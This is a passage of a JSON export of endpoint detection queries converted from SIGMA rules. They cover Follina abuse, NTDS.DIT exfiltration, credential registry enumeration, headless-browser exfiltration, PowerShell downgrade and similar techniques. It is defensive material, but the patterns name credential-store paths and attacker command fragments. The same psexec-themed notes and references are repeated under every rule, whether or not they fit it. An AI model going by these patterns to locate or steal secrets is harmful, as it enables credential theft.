            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Execute Pcwrun.EXE To Leverage Follina",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\pcwrun.exe\" and tgt.process.cmdline contains \"../\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 382
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.) that perform reconnaissance looking for the existence of popular scripting tools (perl, python, wget) on the system via the help commands\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505"
            ],
            "name": "Webshell Tool Reconnaissance Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\caddy.exe\" or src.process.image.path contains \"\\httpd.exe\" or src.process.image.path contains \"\\nginx.exe\" or src.process.image.path contains \"\\php-cgi.exe\" or src.process.image.path contains \"\\w3wp.exe\" or src.process.image.path contains \"\\ws_tomcatservice.exe\") or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (src.process.image.path contains \"-tomcat-\" or src.process.image.path contains \"\\tomcat\")) or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (tgt.process.cmdline contains \"CATALINA_HOME\" or tgt.process.cmdline contains \"catalina.jar\"))) and (tgt.process.cmdline contains \"perl --help\" or tgt.process.cmdline contains \"perl -h\" or tgt.process.cmdline contains \"python --help\" or tgt.process.cmdline contains \"python -h\" or tgt.process.cmdline contains \"python3 --help\" or tgt.process.cmdline contains \"python3 -h\" or tgt.process.cmdline contains \"wget --help\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 383
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects using WorkFolders.exe to execute an arbitrary control.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Execution via WorkFolders.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\control.exe\" and src.process.image.path contains \"\\WorkFolders.exe\") and (not tgt.process.image.path=\"C:\\Windows\\System32\\control.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 384
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1547"
            ],
            "name": "Direct Autorun Keys Modification",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\reg.exe\" and tgt.process.cmdline contains \"add\") and (tgt.process.cmdline contains \"\\software\\Microsoft\\Windows\\CurrentVersion\\Run\" or tgt.process.cmdline contains \"\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\" or tgt.process.cmdline contains \"\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell\" or tgt.process.cmdline contains \"\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" or tgt.process.cmdline contains \"\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" or tgt.process.cmdline contains \"\\system\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 385
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Potential PowerShell Downgrade Attack",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\powershell.exe\" and (tgt.process.cmdline contains \" -version 2 \" or tgt.process.cmdline contains \" -versio 2 \" or tgt.process.cmdline contains \" -versi 2 \" or tgt.process.cmdline contains \" -vers 2 \" or tgt.process.cmdline contains \" -ver 2 \" or tgt.process.cmdline contains \" -ve 2 \" or tgt.process.cmdline contains \" -v 2 \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 386
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects processes that query known 3rd party registry keys that holds credentials via commandline",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1552"
            ],
            "name": "Enumeration for 3rd Party Creds From CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\Software\\SimonTatham\\PuTTY\\Sessions\" or tgt.process.cmdline contains \"\\Software\\SimonTatham\\PuTTY\\SshHostKeys\\\" or tgt.process.cmdline contains \"\\Software\\Mobatek\\MobaXterm\\\" or tgt.process.cmdline contains \"\\Software\\WOW6432Node\\Radmin\\v3.0\\Server\\Parameters\\Radmin\" or tgt.process.cmdline contains \"\\Software\\Aerofox\\FoxmailPreview\" or tgt.process.cmdline contains \"\\Software\\Aerofox\\Foxmail\\V3.1\" or tgt.process.cmdline contains \"\\Software\\IncrediMail\\Identities\" or tgt.process.cmdline contains \"\\Software\\Qualcomm\\Eudora\\CommandLine\" or tgt.process.cmdline contains \"\\Software\\RimArts\\B2\\Settings\" or tgt.process.cmdline contains \"\\Software\\OpenVPN-GUI\\configs\" or tgt.process.cmdline contains \"\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\" or tgt.process.cmdline contains \"\\Software\\FTPWare\\COREFTP\\Sites\" or tgt.process.cmdline contains \"\\Software\\DownloadManager\\Passwords\" or tgt.process.cmdline contains \"\\Software\\OpenSSH\\Agent\\Keys\" or tgt.process.cmdline contains \"\\Software\\TightVNC\\Server\" or tgt.process.cmdline contains \"\\Software\\ORL\\WinVNC3\\Password\" or tgt.process.cmdline contains \"\\Software\\RealVNC\\WinVNC4\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 387
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a Chromium based browser process with the \"headless\" flag and a URL pointing to the mockbin.org service (which can be used to exfiltrate data).",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Chromium Browser Headless Execution To Mockbin Like Site",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and tgt.process.cmdline contains \"--headless\" and (tgt.process.cmdline contains \"://run.mocky\" or tgt.process.cmdline contains \"://mockbin\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 388
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the Notepad++ updater (gup) to launch other commands or executables",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Arbitrary Binary Execution Using GUP Utility",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\gup.exe\" and tgt.process.image.path contains \"\\explorer.exe\") and (not ((tgt.process.image.path contains \"\\explorer.exe\" and tgt.process.cmdline contains \"\\Notepad++\\notepad++.exe\") or src.process.image.path contains \"\\Notepad++\\updater\\\" or not (tgt.process.cmdline matches \"\\.*\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 389
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects service path modification via the \"sc\" binary to a suspicious command or path",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "Suspicious Service Path Modification",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sc.exe\" and (tgt.process.cmdline contains \"config\" and tgt.process.cmdline contains \"binPath\") and (tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"cmd \" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"svchost\" or tgt.process.cmdline contains \"dllhost\" or tgt.process.cmdline contains \"cmd.exe /c\" or tgt.process.cmdline contains \"cmd.exe /k\" or tgt.process.cmdline contains \"cmd.exe /r\" or tgt.process.cmdline contains \"cmd /c\" or tgt.process.cmdline contains \"cmd /k\" or tgt.process.cmdline contains \"cmd /r\" or tgt.process.cmdline contains \"C:\\Users\\Public\" or tgt.process.cmdline contains \"\\Downloads\\\" or tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\" or tgt.process.cmdline contains \"C:\\Windows\\TEMP\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 390
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the initial execution of \"cmd.exe\" which spawns \"explorer.exe\" with the appropriate command line arguments for opening the \"My Computer\" folder.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1135"
            ],
            "name": "File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\cmd.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and tgt.process.image.path contains \"\\explorer.exe\" and tgt.process.cmdline contains \"shell:mycomputerfolder\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 391
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the powerShell New-MailboxExportRequest Cmdlet to exports a mailbox to a remote or local share, as used in ProxyShell exploitations",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious PowerShell Mailbox Export to Share",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"New-MailboxExportRequest\" and tgt.process.cmdline contains \" -Mailbox \" and tgt.process.cmdline contains \" -FilePath \\\\\")) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 392
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects python spawning a pretty tty",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Python Spawning Pretty TTY on Windows",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"python.exe\" or tgt.process.image.path contains \"python3.exe\" or tgt.process.image.path contains \"python2.exe\") and ((tgt.process.cmdline contains \"import pty\" and tgt.process.cmdline contains \".spawn(\") or tgt.process.cmdline contains \"from pty import spawn\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 393
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a process via the Windows task manager. This might be an attempt to bypass UAC",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "New Process Created Via Taskmgr.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\taskmgr.exe\" and (not (tgt.process.image.path contains \":\\Windows\\System32\\mmc.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\resmon.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\Taskmgr.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 394
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1124"
            ],
            "name": "Discovery of a System Time",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\") and tgt.process.cmdline contains \"time\") or (tgt.process.image.path contains \"\\w32tm.exe\" and tgt.process.cmdline contains \"tz\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 395
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process patterns used in NTDS.DIT exfiltration",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Suspicious Process Patterns NTDS.DIT Exfil",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\NTDSDump.exe\" or tgt.process.image.path contains \"\\NTDSDumpEx.exe\") or (tgt.process.cmdline contains \"ntds.dit\" and tgt.process.cmdline contains \"system.hiv\") or tgt.process.cmdline contains \"NTDSgrab.ps1\") or (tgt.process.cmdline contains \"ac i ntds\" and tgt.process.cmdline contains \"create full\") or (tgt.process.cmdline contains \"/c copy \" and tgt.process.cmdline contains \"\\windows\\ntds\\ntds.dit\") or (tgt.process.cmdline contains \"activate instance ntds\" and tgt.process.cmdline contains \"create full\") or (tgt.process.cmdline contains \"powershell\" and tgt.process.cmdline contains \"ntds.dit\")) or (tgt.process.cmdline contains \"ntds.dit\" and ((src.process.image.path contains \"\\apache\" or src.process.image.path contains \"\\tomcat\" or src.process.image.path contains \"\\AppData\\\" or src.process.image.path contains \"\\Temp\\\" or src.process.image.path contains \"\\Public\\\" or src.process.image.path contains \"\\PerfLogs\\\") or (tgt.process.image.path contains \"\\apache\" or tgt.process.image.path contains \"\\tomcat\" or tgt.process.image.path contains \"\\AppData\\\" or tgt.process.image.path contains \"\\Temp\\\" or tgt.process.image.path contains \"\\Public\\\" or tgt.process.image.path contains \"\\PerfLogs\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 396
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious command lines used in Covenant luanchers",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1564"
            ],
            "name": "HackTool - Covenant PowerShell Launcher",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
